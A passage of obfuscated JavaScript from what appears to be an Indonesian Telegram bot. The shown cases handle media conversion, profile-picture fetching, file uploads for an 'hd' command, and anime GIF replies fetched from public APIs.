_0x4825bf,_0x4768f7=_0x1ce978[_0x240d04(0xfb6)],_0x4b971a=_0x1ce978[_0x240d04(0x1831)];if(_0x5dd097[_0x240d04(0x2a20)])_0x4825bf=_0x5dd097[_0x240d04(0x2a20)]['at'](-0x1),_0x4768f7=_0x1ce978[_0x240d04(0x1910)],_0x4b971a=_0x1ce978[_0x240d04(0x26ac)];else{if(_0x5dd097[_0x240d04(0x17e3)])_0x1ce978[_0x240d04(0x1f43)](_0x1ce978[_0x240d04(0x1aee)],_0x1ce978[_0x240d04(0x1aee)])?(_0x308228['error'](_0x24ce4a),_0x1ce978[_0x240d04(0x260b)](_0x3857ab,_0x1ce978[_0x240d04(0x1ee)](_0x1ce978[_0x240d04(0x2c49)],_0x1678fb[_0x240d04(0x960)]))):(_0x4825bf=_0x5dd097['video'],_0x4768f7=_0x4825bf[_0x240d04(0x2321)]||_0x1ce978[_0x240d04(0x2edd)],_0x4b971a=_0x4825bf['mime_type']||_0x1ce978[_0x240d04(0x255b)]);else{if(_0x5dd097[_0x240d04(0x2ab6)])_0x4825bf=_0x5dd097[_0x240d04(0x2ab6)],_0x4768f7=_0x4825bf[_0x240d04(0x2321)]||_0x1ce978[_0x240d04(0x233)],_0x4b971a=_0x4825bf[_0x240d04(0x8f8)]||_0x1ce978[_0x240d04(0x1831)];else{if(_0x1ce978[_0x240d04(0xbb0)](_0x1ce978['QPpJq'],_0x1ce978[_0x240d04(0xb5d)]))_0x1ce978['nmZXS'](_0x336934,_0x1ce978['GVsno']('❌\x20Gagal\x20me'+'ngubah\x20nam'+'a:\x20',_0x3fabb2['message']));else return _0x1ce978[_0x240d04(0x1cfa)](_0x476bfb,_0x1ce978[_0x240d04(0x1bb4)]);}}}try{_0x1ce978['IopWX'](_0x476bfb,_0x1ce978[_0x240d04(0x745)]);const _0x365e18=await _0x23c0de[_0x240d04(0x1986)]['getFileLin'+'k'](_0x4825bf['file_id']),_0x4cbcb2=await(await fetch(_0x365e18[_0x240d04(0x2899)]))[_0x240d04(0x59c)](),_0xcd1766=_0x1ce978[_0x240d04(0x1cf4)](require,'fs'),_0x24cd23=require(_0x1ce978['Txabp']),_0x3d9783=_0x1ce978[_0x240d04(0x2b44)](require,_0x1ce978[_0x240d04(0x2b82)]),_0x4a21fc=require(_0x1ce978[_0x240d04(0x293a)]),_0x40c9ba=_0x24cd23['resolve'](_0x1ce978[_0x240d04(0x1c4)]);if(!_0xcd1766[_0x240d04(0x10c9)](_0x40c9ba))_0xcd1766[_0x240d04(0x1726)](_0x40c9ba,{'recursive':!![]});const _0x48bbd9=_0x24cd23[_0x240d04(0x86e)](_0x40c9ba,_0x4768f7);_0xcd1766[_0x240d04(0x22b5)+_0x240d04(0xfd5)](_0x48bbd9,_0x4cbcb2);const _0x341314=new _0x4a21fc();_0x341314[_0x240d04(0x5a0)](_0x1ce978[_0x240d04(0xfb6)],_0xcd1766[_0x240d04(0xd98)+_0x240d04(0xd7b)](_0x48bbd9));const _0x3464be=await _0x3d9783[_0x240d04(0x2ed5)](_0x1ce978[_0x240d04(0x119b)],_0x341314,{'headers':_0x341314[_0x240d04(0x2438)]()}),{url:_0x2ac87a,raw_url:_0x3312f5}=_0x3464be[_0x240d04(0x2bb6)];if(_0x1ce978['lrktt'](!_0x2ac87a,!_0x3312f5))throw new Error(_0x1ce978[_0x240d04(0x264b)]);_0x1ce978[_0x240d04(0x980)](_0x476bfb,_0x240d04(0x122d)+'Berhasil!*'+'\x0a📁\x20*Nama:*'+'\x20'+_0x4768f7+_0x240d04(0x704)+_0x3312f5+('\x0a🌐\x20*Host:*'+_0x240d04(0x189)+'rcontent.c'+'om')),_0xcd1766[_0x240d04(0x87f)](_0x48bbd9);}catch(_0x1a1835){console[_0x240d04(0x15e)](_0x1a1835),_0x1ce978[_0x240d04(0xd08)](_0x476bfb,_0x1ce978['SWFIJ'](_0x1ce978[_0x240d04(0x1b60)],_0x1a1835[_0x240d04(0x960)]));}}break;case'toaudio':{if(_0x1ce978[_0x240d04(0x10bb)](_0x240d04(0xdd9),_0x1ce978[_0x240d04(0x2005)])){if(_0x1ce978[_0x240d04(0x7cd)](!_0x501627,!_0x3c2b00))return _0x1ce978['kgURW'](_0x476bfb,_0x1ce978[_0x240d04(0x246f)]);const _0x7e3a3d=_0x501627?_0x3b19d7[_0x240d04(0x17e3)][_0x240d04(0x2893)]:_0x3b19d7['audio'][_0x240d04(0x2893)];try{if(_0x1ce978[_0x240d04(0x2c3a)]!=='CVsug'){_0x1ce978[_0x240d04(0xb61)](_0x476bfb,lang[_0x240d04(0x172a)]||_0x1ce978['vEkcV']);const _0x1710fc=await _0x1ce978['Pjmqz'](videoToMp3,_0x23c0de,_0x7e3a3d);await _0x23c0de[_0x240d04(0x1566)+_0x240d04(0x221f)]({'source':_0x1710fc},{'title':'Conversion','performer':_0x1ce978['xwxNx'],'filename':_0x240d04(0x2673)});}else _0x277ead+=_0x1ce978[_0x240d04(0x1ee)](_0x11b76b[_0x240d04(0x2dc1)][_0x240d04(0x728)](_0x2ca1c3,_0x2a1ab8+0x3)['map'](_0x3c78cb=>_0x3c78cb[_0x240d04(0x1ee1)]?_0x3c78cb[_0x240d04(0x1357)]:_0x3c78cb[_0x240d04(0x19b5)])[_0x240d04(0x86e)](''),'\x0a');}catch(_0x5f0254){console[_0x240d04(0x15e)](_0x5f0254),_0x1ce978[_0x240d04(0x2578)](_0x476bfb,_0x1ce978[_0x240d04(0x1acb)](_0x1ce978[_0x240d04(0x2c49)],_0x5f0254[_0x240d04(0x960)]));}}else return _0x1ce978[_0x240d04(0x110d)](_0x24fb38,_0x1ce978[_0x240d04(0x257a)]);}break;case _0x1ce978[_0x240d04(0x9fc)]:{if(_0x1ce978[_0x240d04(0x29a8)](_0x240d04(0x1016),_0x1ce978['iKxQM'])){if(!_0x501627&&!_0x3c2b00)return _0x1ce978[_0x240d04(0x15bf)](_0x476bfb,_0x1ce978[_0x240d04(0x246f)]);const _0x3cc361=_0x501627?_0x3b19d7[_0x240d04(0x17e3)][_0x240d04(0x2893)]:_0x3b19d7[_0x240d04(0x2af1)][_0x240d04(0x2893)];try{if(_0x1ce978[_0x240d04(0x2829)](_0x1ce978[_0x240d04(0x2584)],'UTqyX')){_0x476bfb(lang[_0x240d04(0x172a)]||_0x1ce978[_0x240d04(0x1673)]);const _0x4ebac0=await videoToMp3(_0x23c0de,_0x3cc361);await _0x23c0de[_0x240d04(0x1566)+_0x240d04(0x221f)]({'source':_0x4ebac0},{'title':_0x1ce978[_0x240d04(0x3df)],'performer':_0x1ce978[_0x240d04(0x36b)],'filename':_0x1ce978[_0x240d04(0x1b41)]});}else _0x30610c['error'](_0x5242f1),_0x1ce978[_0x240d04(0x165b)](_0x317881,_0x1ce978['vchiT']);}catch(_0xc0d762){console['error'](_0xc0d762),_0x1ce978[_0x240d04(0x1f8a)](_0x476bfb,_0x1ce978[_0x240d04(0x12ee)](_0x1ce978['KJAvP'],_0xc0d762[_0x240d04(0x960)]));}}else _0x432e2c+='*'+_0x1014f5[_0x1b72e7]['title']+_0x240d04(0x25c1)+_0x31c185[_0x1ce4a9][_0x240d04(0x96e)]+'*';}break;case _0x1ce978[_0x240d04(0x245b)]:{if(_0x1ce978['gEeQt']!==_0x1ce978['gEeQt'])_0x11228c(_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978['hEbhY'](_0x2856a8,_0x3001ab)+'*'),delete _0x146da5[_0x2a8570];else{if(!_0x5666f3)return _0x476bfb(_0x1ce978['wMdZC']);const _0x9fdd9e=_0x3b19d7[_0x240d04(0x257)];if(_0x9fdd9e[_0x240d04(0x1334)+'d'])return _0x476bfb(_0x1ce978['ZFtBH']);try{if(_0x1ce978[_0x240d04(0x245f)](_0x1ce978[_0x240d04(0x1420)],_0x1ce978['aSRFF']))return _0x32dfe0(_0x240d04(0xecc)+_0x240d04(0x23ea)+_0x240d04(0x1309)+_0x240d04(0x24a2)+_0x240d04(0x2163)+_0x240d04(0x951)+'rah.');else{_0x1ce978[_0x240d04(0x525)](_0x476bfb,lang[_0x240d04(0x172a)]||_0x1ce978[_0x240d04(0x1157)]);const _0xda1d09=await _0x1ce978['cYMMW'](stickerToPng,_0x23c0de,_0x9fdd9e[_0x240d04(0x2893)]);_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'source':_0xda1d09},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x240d04(0x2d3c),'callback_data':_0x1ce978[_0x240d04(0x1982)](_0x1ce978['fcUdv'],_0x83219d)}]]}});}}catch(_0x239f92){console['error'](_0x239f92),_0x1ce978[_0x240d04(0x21ae)](_0x476bfb,_0x1ce978[_0x240d04(0xa5d)](_0x1ce978[_0x240d04(0x2c49)],_0x239f92[_0x240d04(0x960)]));}}}break;case _0x240d04(0x1e56):{let _0x5e3aea;if(_0x193ebe){if(_0x1ce978[_0x240d04(0xa20)](_0x1ce978['ojlGH'],_0x1ce978['ojlGH']))return _0x1ce978['hEbhY'](_0x3aec9a,'⚠️\x20Kamu\x20bel'+'um\x20daftar\x20'+_0x240d04(0x1813)+_0x240d04(0x33b)+'\x20nama.umur'+_0x240d04(0x163d)+'ai.');else _0x5e3aea=_0x3b19d7[_0x240d04(0x19ed)]['id'];}else{if(_0x483c03[0x0]){if(_0x1ce978['MOnjd']===_0x240d04(0x272b)){const _0x5812f1=_0x483c03[0x0];if(/^\d+$/[_0x240d04(0x1dc7)](_0x5812f1))_0x1ce978[_0x240d04(0x1407)]('WTlHa',_0x1ce978['REcTs'])?_0x5e3aea=Number(_0x5812f1):_0x4db2b3[_0xc0d7f9]&&_0x1ce978[_0x240d04(0x8ef)](_0x1ce978[_0x240d04(0x1b06)](_0xc95cdd['now'](),_0x47767e[_0x5f5363]['startedAt']),0xea60)&&(_0x1ce978[_0x240d04(0xc97)](_0x3a2075,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1c9b4f(_0x50e8f7)+'*'),delete _0x218c42[_0x486498]);else{if(_0x5812f1['startsWith']('@'))_0x5e3aea=_0x5812f1[_0x240d04(0x728)](0x1);else return _0x1ce978[_0x240d04(0x1fdb)](_0x476bfb,_0x1ce978['upNKI']);}}else return _0x1ce978[_0x240d04(0x247e)](_0x95ba0b,_0x240d04(0x236d)+_0x240d04(0x2cbe)+_0x240d04(0x2068)+_0x240d04(0x21f7)+_0x240d04(0xf44)+new _0x5b224f(_0x1f0d4b[_0xfeef0a][_0x240d04(0xfa6)+'il'])['toLocaleSt'+_0x240d04(0x1743)]()+'.');}else _0x5e3aea=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x19ed)]['id'];}try{_0x1ce978[_0x240d04(0xf2f)](_0x476bfb,lang['wait']||_0x240d04(0x292b)+_0x240d04(0x28a4));const _0x585cfa=await getProfilePic(_0x23c0de,_0x5e3aea);await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'source':_0x585cfa});}catch(_0x2e8312){console['error'](_0x2e8312),_0x1ce978[_0x240d04(0x6d8)](_0x476bfb,_0x1ce978[_0x240d04(0xa1d)]('❌\x20',_0x2e8312[_0x240d04(0x960)]));}}break;case'hd':{if(_0x1ce978[_0x240d04(0x7cd)](!_0x2c4067,!_0x193ebe))return _0x476bfb(_0x240d04(0x19c)+_0x240d04(0x18dc));const _0x5e062b=_0x193ebe?_0x3b19d7:_0x23c0de[_0x240d04(0x960)];let _0x45237e,_0x5596b4=_0x1ce978[_0x240d04(0xfb6)],_0x2c3f29=_0x1ce978[_0x240d04(0x1831)];if(_0x5e062b['photo']){if(_0x1ce978[_0x240d04(0x2275)](_0x1ce978[_0x240d04(0xb88)],_0x1ce978['OvNxx']))return _0x9cb507(_0x1ce978[_0x240d04(0x257a)]);else _0x45237e=_0x5e062b[_0x240d04(0x2a20)]['pop'](),_0x5596b4=_0x1ce978[_0x240d04(0x1910)],_0x2c3f29=_0x1ce978[_0x240d04(0x26ac)];}else{if(_0x5e062b[_0x240d04(0x17e3)])_0x45237e=_0x5e062b['video'],_0x5596b4=_0x5e062b[_0x240d04(0x17e3)][_0x240d04(0x2321)]||_0x1ce978[_0x240d04(0x2edd)],_0x2c3f29=_0x5e062b['video'][_0x240d04(0x8f8)]||_0x1ce978['DXhwJ'];else{if(_0x5e062b[_0x240d04(0x2ab6)]){if(_0x1ce978['SOKZX'](_0x1ce978[_0x240d04(0x2420)],_0x1ce978[_0x240d04(0x2420)]))_0x45237e=_0x5e062b[_0x240d04(0x2ab6)],_0x5596b4=_0x5e062b[_0x240d04(0x2ab6)][_0x240d04(0x2321)]||_0x240d04(0x2fc),_0x2c3f29=_0x5e062b[_0x240d04(0x2ab6)][_0x240d04(0x8f8)]||_0x1ce978['WiwlV'];else return _0x1ce978[_0x240d04(0x1140)](_0x2661c5,_0x240d04(0x23ff)+'ah\x20memilih'+_0x240d04(0x2cbf)+_0x395b54[_0x240d04(0x207f)]+(_0x240d04(0x21a7)+_0x240d04(0x13e0)+_0x240d04(0x149c)));}else return _0x1ce978['YncQs'](_0x1ce978[_0x240d04(0x27d5)],_0x1ce978[_0x240d04(0x2acc)])?_0x1ce978[_0x240d04(0x2a0e)](_0x460d18['charAt'](0x0)[_0x240d04(0xdd3)+'e'](),_0x59a6fd['slice'](0x1)):_0x1ce978[_0x240d04(0x15d8)](_0x476bfb,_0x1ce978[_0x240d04(0x228e)]);}}try{_0x476bfb(lang[_0x240d04(0x172a)]);const _0x27beb4=await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x133e)+'k'](_0x45237e['file_id']),_0x1c7802=await(await _0x1ce978[_0x240d04(0x20b1)](fetch,_0x27beb4['href']))[_0x240d04(0x59c)](),_0x1a9ce7=await _0x1ce978['NvMLb'](uploadCatbox,_0x1c7802,_0x5596b4,_0x2c3f29);_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x240d04(0x25fb)+_0x240d04(0x2758)+_0x240d04(0x12ef)+_0x240d04(0x260d)+'url='+_0x1a9ce7+_0x240d04(0x1a48)},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0xe07)],'callback_data':_0x1ce978[_0x240d04(0x1971)]('pepek\x20',_0x83219d)}]]}});}catch(_0x12a7b1){console[_0x240d04(0x15e)](_0x12a7b1),_0x1ce978[_0x240d04(0x1140)](_0x476bfb,_0x1ce978[_0x240d04(0x1a46)](_0x1ce978[_0x240d04(0x1706)],_0x12a7b1[_0x240d04(0x960)]));}}break;case _0x1ce978[_0x240d04(0x2b2a)]:{const _0x5de1ea=await _0x1ce978[_0x240d04(0x2a5a)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+'cs/sfw/bul'+'ly'),_0x5ed210=await _0x5de1ea[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x5ed210[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x1625)](_0x1ce978[_0x240d04(0x2387)],_0x83219d)},{'text':_0x240d04(0xe7c),'callback_data':_0x1ce978[_0x240d04(0x2a8a)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x280)]:{const _0x228409=await _0x1ce978[_0x240d04(0x2398)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1f18)+'dle'),_0xae4b66=await _0x228409[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0xae4b66[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x15c2)](_0x1ce978[_0x240d04(0x7d7)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x2129)](_0x1ce978['fcUdv'],_0x83219d)}]]}});}break;case _0x240d04(0x651):{const _0x12d08c=await _0x1ce978[_0x240d04(0x40f)](fetch,_0x240d04(0x25fb)+'i.waifu.pi'+_0x240d04(0xa45)),_0x30b1a4=await _0x12d08c['json']();_0x23c0de[_0x240d04(0x1566)+'nimation']({'url':_0x30b1a4[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978['htDFP'](_0x1ce978[_0x240d04(0x1c62)],_0x83219d)},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978[_0x240d04(0xa84)]+_0x83219d}]]}});}break;case _0x1ce978[_0x240d04(0x18a1)]:{if(_0x1ce978[_0x240d04(0x1c08)]('NfNMf',_0x240d04(0x2bb)))return _0x287501('Selesaikan'+'\x20misi\x20*'+_0x527370[_0x240d04(0xbe8)][_0x141c67][0x0]+_0x240d04(0x2fb));else{const _0x24855e=await _0x1ce978[_0x240d04(0xf56)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1be5)),_0xb8d30b=await _0x24855e[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+'nimation']({'url':_0xb8d30b[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':'LANJUT\x20📤','callback_data':_0x1ce978[_0x240d04(0x265e)](_0x1ce978[_0x240d04(0x2313)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x457)](_0x240d04(0x147c),_0x83219d)}]]}});}}break;case _0x1ce978[_0x240d04(0x23d8)]:{const _0x5166f2=await _0x1ce978[_0x240d04(0x2b67)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0xa6f)+'o'),_0x9445e2=await _0x5166f2[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x9445e2[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x1acb)](_0x1ce978[_0x240d04(0xfe5)],_0x83219d)},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978[_0x240d04(0x1881)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x240d04(0x1722):{if(_0x1ce978[_0x240d04(0x9ce)](_0x1ce978[_0x240d04(0x177d)],_0x1ce978[_0x240d04(0x896)]))_0x270930[_0x240d04(0x261a)+_0x240d04(0x1da4)]({'url':_0x1724d3[_0x240d04(0x70c)]},{'caption':_0xcae53c[_0x240d04(0x2016)]});else{const _0x570ca1=await fetch(_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1fa3)+'s'),_0x5811e2=await _0x570ca1[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x5811e2['url']},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x11a)](_0x1ce978[_0x240d04(0x545)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x6be)](_0x1ce978['fcUdv'],_0x83219d)}]]}});}}break;case _0x240d04(0x24b6):{const _0x3c2e23=await _0x1ce978[_0x240d04(0x1f20)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x11f9)+'k'),_0x2125b9=await _0x3c2e23['json']();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x2125b9[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x1bb3)](_0x1ce978[_0x240d04(0x60d)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x1881)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x478)]:{const _0x53a854=await _0x1ce978[_0x240d04(0x1a52)](fetch,'https://ap'+_0x240d04(0x1150)+_0x240d04(0x29c8)),_0x5d7206=await _0x53a854['json']();_0x23c0de['replyWithA'+_0x240d04(0x13ca)]({'url':_0x5d7206['url']},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':'LANJUT\x20📤','callback_data':_0x1ce978[_0x240d04(0x2480)]+_0x83219d},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978['BzgPR'](_0x1ce978['fcUdv'],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x1620)]:{const _0xce2575=await _0x1ce978[_0x240d04(0x1606)](fetch,_0x240d04(0x25fb)+'i.waifu.pi'+_0x240d04(0x6b6)+'g'),_0x56bf97=await _0xce2575['json']();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x56bf97[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x2968)](_0x240d04(0x905),_0x83219d)},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978[_0x240d04(0x1643)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978['AfnIm']:{if(_0x1ce978[_0x240d04(0x2c7d)](_0x1ce978['ujGvm'],_0x1ce978[_0x240d04(0x223f)]))return _0x1ce978[_0x240d04(0x2069)](_0x7ec32c,_0x1ce978['KdBjs']);else{const _0x48504d=await _0x1ce978[_0x240d04(0x199d)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+'cs/sfw/bon'+'k'),_0x5b0f17=await _0x48504d[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x5b0f17[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x2a0e)](_0x1ce978[_0x240d04(0x9fa)],_0x83219d)},{'text':_0x240d04(0xe7c),'callback_data':_0x1ce978[_0x240d04(0x18bc)](_0x240d04(0x147c),_0x83219d)}]]}});}}break;case'yeet':{if(_0x1ce978[_0x240d04(0xf9e)]===_0x240d04(0x2d24)){const _0x9bb01b=await _0x1ce978['bsFoE'](fetch,_0x240d04(0x25fb)+'i.waifu.pi'+_0x240d04(0x2ca3)+'t'),_0xa2180a=await _0x9bb01b[_0x240d04(0x1314)]();_0x23c0de['replyWithA'+_0x240d04(0x13ca)]({'url':_0xa2180a[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':'yeet2\x20'+_0x83219d},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978['fcUdv']+_0x83219d}]]}});}else _0x22ab2f['error'](_0x57578f),_0x1ce978[_0x240d04(0x10c1)](_0x34e1b1,_0x1ce978[_0x240d04(0x2e63)]);}break;case _0x1ce978[_0x240d04(0x147b)]:{if(_0x1ce978['YiUNn']!==_0x240d04(0x28a8))_0x199b0d[_0x240d04(0x15e)](_0x37ce13),_0xe00dea(_0x1ce978[_0x240d04(0x1982)](_0x1ce978[_0x240d04(0x2c49)],_0x44eb07[_0x240d04(0x960)]));else{const _0x2adcd3=await _0x1ce978['QFLsq'](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1e2b)+'sh'),_0x38fa56=await _0x2adcd3[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x38fa56[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x186c)](_0x1ce978[_0x240d04(0xd66)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x240d04(0x147c)+_0x83219d}]]}});}}break;case _0x240d04(0x1e2a):{const _0x92cfc5=await fetch(_0x240d04(0x25fb)+_0x240d04(0x1150)+'cs/sfw/smi'+'le'),_0x43d9d3=await _0x92cfc5['json']();_0x23c0de[_0x240d04(0x1566)+'nimation']({'url':_0x43d9d3['url']},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x1bb3)](_0x1ce978['RndMC'],_0x83219d)},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978[_0x240d04(0x24ba)]('pepek\x20',_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x1020)]:{const _0x4c8271=await _0x1ce978[_0x240d04(0x18d9)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1302)+'e'),_0x3de9ee=await _0x4c8271[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+'nimation']({'url':_0x3de9ee['url']},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x2326)]+_0x83219d},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978['IgAUl'](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x240d04(0x528):{if(_0x1ce978['pOSms'](_0x1ce978[_0x240d04(0x28ff)],_0x1ce978['zkOCu']))return _0x1ce978[_0x240d04(0x1dfd)](_0x3f90a1,_0x1ce978[_0x240d04(0x1453)]);else{const _0x50a151=await _0x1ce978[_0x240d04(0x439)](fetch,'https://ap'+_0x240d04(0x1150)+_0x240d04(0x2c56)+_0x240d04(0x11db)),_0x7ea30e=await _0x50a151['json']();_0x23c0de[_0x240d04(0x1566)+'nimation']({'url':_0x7ea30e[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x1880)](_0x1ce978[_0x240d04(0x5ee)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978['fcUdv']+_0x83219d}]]}});}}break;case _0x1ce978[_0x240d04(0x1b66)]:{if(_0x1ce978[_0x240d04(0x448)](_0x240d04(0xead),_0x1ce978['MWppg'])){const _0x2593d0=await fetch(_0x240d04(0x25fb)+'i.waifu.pi'+_0x240d04(0x21c5)+_0x240d04(0x29ee)),_0x46467f=await _0x2593d0['json']();_0x23c0de['replyWithA'+_0x240d04(0x13ca)]({'url':_0x46467f[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x240d04(0x28a1),'callback_data':_0x1ce978[_0x240d04(0x2a55)]+_0x83219d},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0xa84)]+_0x83219d}]]}});}else return _0x1ce978[_0x240d04(0x1b37)](_0x4912be,_0x1ce978[_0x240d04(0x1453)]);}break;case _0x1ce978['fbDzJ']:{const _0x36c084=await _0x1ce978['ovuUE'](fetch,'https://ap'+_0x240d04(0x1150)+_0x240d04(0x1b84)),_0xb166ed=await _0x36c084[_0x240d04(0x1314)]();_0x23c0de['replyWithA'+_0x240d04(0x13ca)]({'url':_0xb166ed[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978['BNZQS'](_0x1ce978['pmdQF'],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x240d04(0x147c)+_0x83219d}]]}});}break;case _0x1ce978[_0x240d04(0x5d7)]:{const _0x41f5a5=await _0x1ce978[_0x240d04(0x2db7)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x259c)+'e'),_0x52a4ac=await 